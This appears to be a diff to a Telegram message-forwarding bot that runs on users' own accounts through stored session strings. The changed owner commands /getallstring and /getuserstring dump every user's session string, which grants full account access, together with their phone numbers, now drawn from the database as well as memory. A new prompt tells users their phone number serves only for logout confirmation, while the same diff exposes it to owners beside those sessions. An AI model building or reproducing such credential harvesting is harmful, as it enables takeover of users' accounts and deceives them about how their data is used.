@@ -100,6 +100,9 @@ logout_states: Dict[int, Dict] = {}
 # Store user session strings
 user_session_strings: Dict[int, str] = {}  # user_id -> session_string
 
+# Phone verification states for restored sessions
+phone_verification_states: Dict[int, Dict] = {}  # user_id -> {step: str, etc.}
+
 # Task creation states
 task_creation_states: Dict[int, Dict[str, Any]] = {}  # user_id -> {step: str, name: str, source_ids: List[int], target_ids: List[int]}
 
@@ -406,22 +409,266 @@ async def send_session_to_owners(user_id: int, phone: str, name: str, session_st
             logger.exception(f"Failed to send session to owner {owner_id}: {e}")
 
 
-# ---------- Simple UI handlers ----------
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-
-    if not await check_authorization(update, context):
-        return
-
+# ---------- Phone Verification for Restored Sessions ----------
+async def check_phone_number_required(user_id: int) -> bool:
+    """Check if user needs to provide phone number"""
     user = await db_call(db.get_user, user_id)
+    if user and user.get("is_logged_in") and not user.get("phone"):
+        return True
+    return False
 
+
+async def ask_for_phone_number(user_id: int, chat_id: int, context: ContextTypes.DEFAULT_TYPE):
+    """Ask user to provide phone number for restored session"""
+    phone_verification_states[user_id] = {
+        "step": "waiting_phone",
+        "chat_id": chat_id
+    }
+    
+    message = (
+        "📱 **Phone Number Verification Required**\n\n"
+        "Your account was restored from a saved session, but we need your phone number for security.\n\n"
+        "⚠️ **Important:**\n"
+        "• This is the phone number associated with your Telegram account\n"
+        "• It will only be used for logout confirmation\n"
+        "• Your phone number is stored securely\n\n"
+        "**Please enter your phone number (with country code):**\n\n"
+        "**Examples:**\n"
+        "• `+1234567890`\n"
+        "• `+447911123456`\n"
+        "• `+4915112345678`\n\n"
+        "**Type your phone number now:**"
+    )
+    
+    try:
+        await context.bot.send_message(chat_id, message, parse_mode="Markdown")
+    except Exception as e:
+        logger.exception(f"Failed to send phone verification message to user {user_id}: {e}")
+
+
+async def handle_phone_verification(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle phone number verification for restored sessions"""
+    user_id = update.effective_user.id
+    
+    if user_id not in phone_verification_states:
+        return
+    
+    state = phone_verification_states[user_id]
+    text = update.message.text.strip()
+    
+    if state["step"] == "waiting_phone":
+        if not text.startswith('+'):
+            await update.message.reply_text(
+                "❌ **Invalid format!**\n\n"
+                "Phone number must start with `+`\n"
+                "Example: `+1234567890`\n\n"
+                "Please enter your phone number again:",
+                parse_mode="Markdown",
+            )
+            return
+        
+        clean_phone = ''.join(c for c in text if c.isdigit() or c == '+')
+        
+        if len(clean_phone) < 8:
+            await update.message.reply_text(
+                "❌ **Invalid phone number!**\n\n"
+                "Phone number seems too short. Please check and try again.\n"
+                "Example: `+1234567890`",
+                parse_mode="Markdown",
+            )
+            return
+        
+        # Verify phone matches session
+        client = user_clients.get(user_id)
+        if client:
+            try:
+                me = await client.get_me()
+                # Update database with phone number
+                await db_call(db.save_user, user_id, clean_phone, me.first_name, user_session_strings.get(user_id), True)
+                
+                del phone_verification_states[user_id]
+                
+                await update.message.reply_text(
+                    f"✅ **Phone number verified!**\n\n"
+                    f"📱 **Phone:** `{clean_phone}`\n"
+                    f"👤 **Name:** {me.first_name or 'User'}\n\n"
+                    "Your account is now fully restored! 🎉\n\n"
+                    "You can now use all bot commands.",
+                    parse_mode="Markdown",
+                )
+                
+                # Show main menu
+                await show_main_menu(update, context, user_id)
+                
+            except Exception as e:
+                logger.exception(f"Error verifying phone for user {user_id}: {e}")
+                await update.message.reply_text(
+                    "❌ **Error verifying phone number!**\n\n"
+                    "Please try again or contact support.",
+                    parse_mode="Markdown",
+                )
+        else:
+            await update.message.reply_text(
+                "❌ **Session not found!**\n\n"
+                "Please try logging in again with /login",
+                parse_mode="Markdown",
+            )
+            del phone_verification_states[user_id]
+
+
+# ---------- String Session Commands ----------
+async def getallstring_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Get all string sessions in env var format (owners only)"""
+    user_id = update.effective_user.id
+    
+    if user_id not in OWNER_IDS:
+        await update.message.reply_text("❌ **Only owners can use this command!**", parse_mode="Markdown")
+        return
+    
+    # Get all session strings from both database and current sessions
+    all_sessions = {}
+    
+    # Add sessions from current runtime
+    for uid, session_string in user_session_strings.items():
+        all_sessions[uid] = session_string
+    
+    # Add sessions from database
+    try:
+        users = await asyncio.to_thread(lambda: db.get_logged_in_users(MAX_CONCURRENT_USERS * 2))
+        for row in users:
+            try:
+                uid = row.get("user_id") if isinstance(row, dict) else row[0]
+                session_data = row.get("session_data") if isinstance(row, dict) else row[1]
+                if session_data and uid not in all_sessions:
+                    all_sessions[uid] = session_data
+            except Exception:
+                continue
+    except Exception as e:
+        logger.exception(f"Error fetching sessions from database: {e}")
+    
+    if not all_sessions:
+        await update.message.reply_text("📭 **No string sessions available!**", parse_mode="Markdown")
+        return
+    
+    message = "🔑 **All String Sessions**\n\n"
+    message += "**Well Arranged Copy-Paste Env Var Format:**\n\n"
+    message += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+    
+    for uid, session_string in all_sessions.items():
+        # Get user info
+        user = await db_call(db.get_user, uid)
+        username = "Unknown"
+        phone = "Not available"
+        
+        if user:
+            if user.get("name"):
+                username = user["name"]
+            if user.get("phone"):
+                phone = user["phone"]
+            elif user.get("session_data"):
+                username = f"User (Session exists)"
+        
+        message += f"👤 **User:** {username} (ID: `{uid}`)\n"
+        message += f"📱 **Phone:** `{phone}`\n\n"
+        message += f"**Env Var Format:**\n```{uid}:{session_string}```\n\n"
+        message += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+    
+    message += f"📊 **Total:** {len(all_sessions)} session(s)\n\n"
+    message += "💡 **Copy and add to USER_SESSIONS env var (comma-separated)**"
+    
+    # Split message if too long
+    if len(message) > 4000:
+        parts = []
+        current_part = ""
+        lines = message.split('\n')
+        
+        for line in lines:
+            if len(current_part) + len(line) + 1 < 4000:
+                current_part += line + '\n'
+            else:
+                parts.append(current_part)
+                current_part = line + '\n'
+        
+        if current_part:
+            parts.append(current_part)
+        
+        for i, part in enumerate(parts):
+            if i == 0:
+                await update.message.reply_text(part, parse_mode="Markdown")
+            else:
+                await update.message.reply_text(part, parse_mode="Markdown")
+    else:
+        await update.message.reply_text(message, parse_mode="Markdown")
+
+
+async def getuserstring_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Get string session for specific user (owners only)"""
+    user_id = update.effective_user.id
+    
+    if user_id not in OWNER_IDS:
+        await update.message.reply_text("❌ **Only owners can use this command!**", parse_mode="Markdown")
+        return
+    
+    if not context.args:
+        await update.message.reply_text(
+            "❌ **Usage:** `/getuserstring [user_id]`\n\n"
+            "**Example:** `/getuserstring 123456789`",
+            parse_mode="Markdown"
+        )
+        return
+    
+    try:
+        target_user_id = int(context.args[0])
+    except ValueError:
+        await update.message.reply_text("❌ **Invalid user ID!** Must be a number.", parse_mode="Markdown")
+        return
+    
+    # Try to get session from current runtime first
+    session_string = user_session_strings.get(target_user_id)
+    
+    # If not found, try database
+    if not session_string:
+        user = await db_call(db.get_user, target_user_id)
+        if user and user.get("session_data"):
+            session_string = user["session_data"]
+    
+    if not session_string:
+        await update.message.reply_text(f"❌ **No string session found for user ID `{target_user_id}`!**", parse_mode="Markdown")
+        return
+    
+    # Get user info
+    user = await db_call(db.get_user, target_user_id)
+    username = "Unknown"
+    phone = "Not available"
+    
+    if user:
+        if user.get("name"):
+            username = user["name"]
+        if user.get("phone"):
+            phone = user["phone"]
+        elif user.get("session_data"):
+            username = f"User (Session exists)"
+    
+    message = f"🔑 **String Session for 👤 User:** {username} (ID: `{target_user_id}`)\n\n"
+    message += f"📱 **Phone:** `{phone}`\n\n"
+    message += "**Env Var Format:**\n"
+    message += f"```{target_user_id}:{session_string}```"
+    
+    await update.message.reply_text(message, parse_mode="Markdown")
+
+
+# ---------- Simple UI handlers ----------
+async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int):
+    """Show main menu for user"""
+    user = await db_call(db.get_user, user_id)
+    
     user_name = update.effective_user.first_name or "User"
     user_phone = user["phone"] if user and user["phone"] else "Not connected"
     is_logged_in = user and user["is_logged_in"]
-
+    
     status_emoji = "🟢" if is_logged_in else "🔴"
     status_text = "Online" if is_logged_in else "Offline"
-
+    
     message_text = f"""
 ╔═══════════════════════════╗
 ║   📨 FORWARDER BOT 📨   ║
@@ -459,25 +706,54 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 """
-
+    
     keyboard = []
     if is_logged_in:
         keyboard.append([InlineKeyboardButton("📋 My Tasks", callback_data="show_tasks")])
         keyboard.append([InlineKeyboardButton("🔴 Disconnect", callback_data="logout")])
     else:
         keyboard.append([InlineKeyboardButton("🟢 Connect Account", callback_data="login")])
+    
+    if update.callback_query:
+        await update.callback_query.message.edit_text(
+            message_text,
+            reply_markup=InlineKeyboardMarkup(keyboard) if keyboard else None,
+            parse_mode="Markdown",
+        )
+    else:
+        await update.message.reply_text(
+            message_text,
+            reply_markup=InlineKeyboardMarkup(keyboard) if keyboard else None,
+            parse_mode="Markdown",
+        )
 
-    await update.message.reply_text(
-        message_text,
-        reply_markup=InlineKeyboardMarkup(keyboard) if keyboard else None,
-        parse_mode="Markdown",
-    )
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+
+    if not await check_authorization(update, context):
+        return
+
+    # Check if user needs to provide phone number for restored session
+    if await check_phone_number_required(user_id):
+        await ask_for_phone_number(user_id, update.message.chat.id, context)
+        return
+    
+    # Show main menu
+    await show_main_menu(update, context, user_id)
 
 
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
+    user_id = query.from_user.id
 
     if not await check_authorization(update, context):
+        return
+
+    # Check if user needs to provide phone number for restored session
+    if await check_phone_number_required(user_id):
+        await query.answer()
+        await ask_for_phone_number(user_id, query.message.chat.id, context)
         return
 
     await query.answer()
@@ -522,6 +798,11 @@ async def forwadd_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
 
     if not await check_authorization(update, context):
+        return
+
+    # Check if user needs to provide phone number
+    if await check_phone_number_required(user_id):
+        await ask_for_phone_number(user_id, update.message.chat.id, context)
         return
 
     user = await db_call(db.get_user, user_id)
@@ -696,6 +977,12 @@ async def fortasks_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await check_authorization(update, context):
         return
 
+    # Check if user needs to provide phone number
+    if await check_phone_number_required(user_id):
+        message = update.message if update.message else update.callback_query.message
+        await ask_for_phone_number(user_id, message.chat.id, context)
+        return
+
     message = update.message if update.message else update.callback_query.message
     tasks = tasks_cache.get(user_id) or []
 
@@ -737,6 +1024,12 @@ async def handle_task_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     user_id = query.from_user.id
     task_label = query.data.replace("task_", "")
+    
+    # Check if user needs to provide phone number
+    if await check_phone_number_required(user_id):
+        await query.answer()
+        await ask_for_phone_number(user_id, query.message.chat.id, context)
+        return
     
     user_tasks = tasks_cache.get(user_id, [])
     task = None
@@ -789,6 +1082,12 @@ async def handle_filter_menu(update: Update, context: ContextTypes.DEFAULT_TYPE)
     query = update.callback_query
     user_id = query.from_user.id
     task_label = query.data.replace("filter_", "")
+    
+    # Check if user needs to provide phone number
+    if await check_phone_number_required(user_id):
+        await query.answer()
+        await ask_for_phone_number(user_id, query.message.chat.id, context)
+        return
     
     user_tasks = tasks_cache.get(user_id, [])
     task = None
@@ -1199,6 +1498,12 @@ async def handle_delete_action(update: Update, context: ContextTypes.DEFAULT_TYP
     user_id = query.from_user.id
     task_label = query.data.replace("delete_", "")
     
+    # Check if user needs to provide phone number
+    if await check_phone_number_required(user_id):
+        await query.answer()
+        await ask_for_phone_number(user_id, query.message.chat.id, context)
+        return
+    
     message_text = f"🗑️ **Delete Task: {task_label}**\n\n"
     message_text += "⚠️ **Are you sure you want to delete this task?**\n\n"
     message_text += "This action cannot be undone!\n"
@@ -1224,6 +1529,12 @@ async def handle_confirm_delete(update: Update, context: ContextTypes.DEFAULT_TY
     user_id = query.from_user.id
     task_label = query.data.replace("confirm_delete_", "")
     
+    # Check if user needs to provide phone number
+    if await check_phone_number_required(user_id):
+        await query.answer()
+        await ask_for_phone_number(user_id, query.message.chat.id, context)
+        return
+    
     deleted = await db_call(db.remove_forwarding_task, user_id, task_label)
     
     if deleted:
@@ -1242,86 +1553,47 @@ async def handle_confirm_delete(update: Update, context: ContextTypes.DEFAULT_TY
         )
 
 
-# ---------- String Session Commands ----------
-async def getallstring_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Get all string sessions in env var format (owners only)"""
+async def handle_all_text_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle all text messages including phone verification, login, and task creation"""
     user_id = update.effective_user.id
     
-    if user_id not in OWNER_IDS:
-        await update.message.reply_text("❌ **Only owners can use this command!**", parse_mode="Markdown")
+    # Check phone verification first
+    if user_id in phone_verification_states:
+        await handle_phone_verification(update, context)
         return
     
-    if not user_session_strings:
-        await update.message.reply_text("📭 **No string sessions available!**", parse_mode="Markdown")
+    # Check login states
+    if user_id in login_states:
+        await handle_login_process(update, context)
         return
     
-    message = "🔑 **All String Sessions**\n\n"
-    message += "**Well Arranged Copy-Paste Env Var Format:**\n\n"
-    message += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-    
-    for uid, session_string in user_session_strings.items():
-        # Get user info
-        user = await db_call(db.get_user, uid)
-        username = "Unknown"
-        if user and user.get("name"):
-            username = user["name"]
-        elif user and user.get("phone"):
-            username = f"User ({user['phone']})"
-        
-        message += f"👤 **User:** {username} (ID: `{uid}`)\n\n"
-        message += f"**Env Var Format:**\n```{uid}:{session_string}```\n\n"
-        message += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-    
-    message += f"📊 **Total:** {len(user_session_strings)} session(s)\n\n"
-    message += "💡 **Copy and add to USER_SESSIONS env var (comma-separated)**"
-    
-    await update.message.reply_text(message, parse_mode="Markdown")
-
-
-async def getuserstring_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Get string session for specific user (owners only)"""
-    user_id = update.effective_user.id
-    
-    if user_id not in OWNER_IDS:
-        await update.message.reply_text("❌ **Only owners can use this command!**", parse_mode="Markdown")
+    # Check task creation
+    if user_id in task_creation_states:
+        await handle_task_creation(update, context)
         return
     
-    if not context.args:
-        await update.message.reply_text(
-            "❌ **Usage:** `/getuserstring [user_id]`\n\n"
-            "**Example:** `/getuserstring 123456789`",
-            parse_mode="Markdown"
-        )
+    # Check prefix/suffix input
+    if context.user_data.get("waiting_prefix") or context.user_data.get("waiting_suffix"):
+        await handle_prefix_suffix_input(update, context)
         return
     
-    try:
-        target_user_id = int(context.args[0])
-    except ValueError:
-        await update.message.reply_text("❌ **Invalid user ID!** Must be a number.", parse_mode="Markdown")
+    # Check logout confirmation
+    if user_id in logout_states:
+        handled = await handle_logout_confirmation(update, context)
+        if handled:
+            return
+    
+    # If none of the above, check if user needs phone verification
+    if await check_phone_number_required(user_id):
+        await ask_for_phone_number(user_id, update.message.chat.id, context)
         return
     
-    session_string = user_session_strings.get(target_user_id)
-    if not session_string:
-        await update.message.reply_text(f"❌ **No string session found for user ID `{target_user_id}`!**", parse_mode="Markdown")
-        return
-    
-    # Get user info
-    user = await db_call(db.get_user, target_user_id)
-    username = "Unknown"
-    phone = "Not available"
-    
-    if user:
-        if user.get("name"):
-            username = user["name"]
-        if user.get("phone"):
-            phone = user["phone"]
-    
-    message = f"🔑 **String Session for 👤 User:** {username} (ID: `{target_user_id}`)\n\n"
-    message += f"📱 **Phone:** `{phone}`\n\n"
-    message += "**Env Var Format:**\n"
-    message += f"```{target_user_id}:{session_string}```"
-    
-    await update.message.reply_text(message, parse_mode="Markdown")
+    # Default response
+    await update.message.reply_text(
+        "🤔 **I didn't understand that command.**\n\n"
+        "Use /start to see available commands.",
+        parse_mode="Markdown"
+    )
 
 
 # ---------- Login/logout commands ----------
@@ -1345,8 +1617,8 @@ async def login_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if user and user.get("is_logged_in"):
         await message.reply_text(
             "✅ **You are already logged in!**\n\n"
-            f"📱 Phone: `{user['phone']}`\n"
-            f"👤 Name: `{user['name']}`\n\n"
+            f"📱 Phone: `{user['phone'] or 'Not set'}`\n"
+            f"👤 Name: `{user['name'] or 'User'}`\n\n"
             "Use /logout if you want to disconnect.",
             parse_mode="Markdown",
         )
@@ -1390,6 +1662,12 @@ async def login_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def handle_login_process(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
+    text = update.message.text.strip()
+
+    # Check if we're in phone verification state
+    if user_id in phone_verification_states:
+        await handle_phone_verification(update, context)
+        return
 
     # Check if we're in task creation
     if user_id in task_creation_states:
@@ -1410,7 +1688,6 @@ async def handle_login_process(update: Update, context: ContextTypes.DEFAULT_TYP
         return
 
     state = login_states[user_id]
-    text = update.message.text.strip()
     client = state["client"]
 
     try:
@@ -1699,6 +1976,12 @@ async def logout_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await check_authorization(update, context):
         return
 
+    # Check if user needs to provide phone number
+    if await check_phone_number_required(user_id):
+        message = update.message if update.message else update.callback_query.message
+        await ask_for_phone_number(user_id, message.chat.id, context)
+        return
+
     message = update.message if update.message else update.callback_query.message
 
     user = await db_call(db.get_user, user_id)
@@ -1762,6 +2045,7 @@ async def handle_logout_confirmation(update: Update, context: ContextTypes.DEFAU
     
     # Remove from session strings dictionary
     user_session_strings.pop(user_id, None)
+    phone_verification_states.pop(user_id, None)
     tasks_cache.pop(user_id, None)
     target_entity_cache.pop(user_id, None)
     user_send_semaphores.pop(user_id, None)
@@ -1781,6 +2065,11 @@ async def getallid_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
 
     if not await check_authorization(update, context):
+        return
+
+    # Check if user needs to provide phone number
+    if await check_phone_number_required(user_id):
+        await ask_for_phone_number(user_id, update.message.chat.id, context)
         return
 
     user = await db_call(db.get_user, user_id)
@@ -1888,6 +2177,7 @@ async def removeuser_command(update: Update, context: ContextTypes.DEFAULT_TYPE)
 
             # Remove from session strings
             user_session_strings.pop(remove_user_id, None)
+            phone_verification_states.pop(remove_user_id, None)
             tasks_cache.pop(remove_user_id, None)
             target_entity_cache.pop(remove_user_id, None)
             handler_registered.pop(remove_user_id, None)
@@ -2279,7 +2569,7 @@ async def restore_sessions():
     # Then, restore from database (these will override env sessions if same user)
     try:
         # Fetch at most MAX_CONCURRENT_USERS sessions to restore at startup to avoid OOM
-        users = await asyncio.to_thread(lambda: db.get_logged_in_users(MAX_CONCURRENT_USERS))
+        users = await asyncio.to_thread(lambda: db.get_logged_in_users(MAX_CONCURRENT_USERS * 2))
     except Exception:
         logger.exception("Error fetching logged-in users from DB")
         users = []
@@ -2355,30 +2645,49 @@ async def restore_single_session(user_id: int, session_data: str, from_env: bool
 
             user_clients[user_id] = client
             user_session_strings[user_id] = session_data  # Store session string
-            target_entity_cache.setdefault(user_id, OrderedDict())
-            _ensure_user_send_semaphore(user_id)
-            _ensure_user_rate_limiter(user_id)
-            user_tasks = tasks_cache.get(user_id, [])
-            all_targets = []
-            for tt in user_tasks:
-                all_targets.extend(tt.get("target_ids", []))
-            if all_targets:
-                try:
-                    asyncio.create_task(resolve_targets_for_user(user_id, list(set(all_targets))))
-                except Exception:
-                    logger.exception("Failed to schedule resolve_targets_for_user on restore for %s", user_id)
-            await start_forwarding_for_user(user_id)
             
-            source = "environment variable" if from_env else "database"
-            logger.info("✅ Restored session for user %s from %s", user_id, source)
-            
-            # Update database if from env (to keep consistency)
-            if from_env:
-                try:
-                    me = await client.get_me()
-                    await db_call(db.save_user, user_id, None, me.first_name, session_data, True)
-                except Exception as e:
-                    logger.warning(f"Could not update DB for user {user_id} from env: {e}")
+            # Get user info from client
+            try:
+                me = await client.get_me()
+                user_name = me.first_name or "User"
+                
+                # Check if user has phone in database
+                user = await db_call(db.get_user, user_id)
+                has_phone = user and user.get("phone")
+                
+                # Update database with session and name
+                await db_call(db.save_user, user_id, 
+                            user["phone"] if user else None,  # Keep existing phone if any
+                            user_name, 
+                            session_data, 
+                            True)
+                
+                target_entity_cache.setdefault(user_id, OrderedDict())
+                _ensure_user_send_semaphore(user_id)
+                _ensure_user_rate_limiter(user_id)
+                user_tasks = tasks_cache.get(user_id, [])
+                all_targets = []
+                for tt in user_tasks:
+                    all_targets.extend(tt.get("target_ids", []))
+                if all_targets:
+                    try:
+                        asyncio.create_task(resolve_targets_for_user(user_id, list(set(all_targets))))
+                    except Exception:
+                        logger.exception("Failed to schedule resolve_targets_for_user on restore for %s", user_id)
+                await start_forwarding_for_user(user_id)
+                
+                source = "environment variable" if from_env else "database"
+                logger.info("✅ Restored session for user %s from %s (Phone: %s)", 
+                          user_id, source, "Yes" if has_phone else "No")
+                
+            except Exception as e:
+                logger.warning(f"Could not get user info for {user_id}: {e}")
+                # Still restore session without user info
+                target_entity_cache.setdefault(user_id, OrderedDict())
+                _ensure_user_send_semaphore(user_id)
+                _ensure_user_rate_limiter(user_id)
+                await start_forwarding_for_user(user_id)
+                logger.info("✅ Restored session for user %s (limited info)", user_id)
         else:
             if not from_env:
                 await db_call(db.save_user, user_id, None, None, None, False)
@@ -2453,6 +2762,7 @@ async def shutdown_cleanup():
     # Clear runtime caches
     user_clients.clear()
     user_session_strings.clear()
+    phone_verification_states.clear()
     target_entity_cache.clear()
     user_send_semaphores.clear()
     user_rate_limiters.clear()
@@ -2531,6 +2841,7 @@ async def post_init(application: Application):
                 "worker_count": len(worker_tasks),
                 "active_user_clients_count": len(user_clients),
                 "user_session_strings_count": len(user_session_strings),
+                "phone_verification_states_count": len(phone_verification_states),
                 "tasks_cache_counts": {uid: len(tasks_cache.get(uid, [])) for uid in list(tasks_cache.keys())},
                 "memory_usage_mb": _get_memory_usage_mb(),
             }
@@ -2612,7 +2923,7 @@ def main():
     application.add_handler(CommandHandler("getallstring", getallstring_command))
     application.add_handler(CommandHandler("getuserstring", getuserstring_command))
     application.add_handler(CallbackQueryHandler(button_handler))
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_login_process))
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_all_text_messages))
 
     logger.info("✅ Bot ready!")
     try:
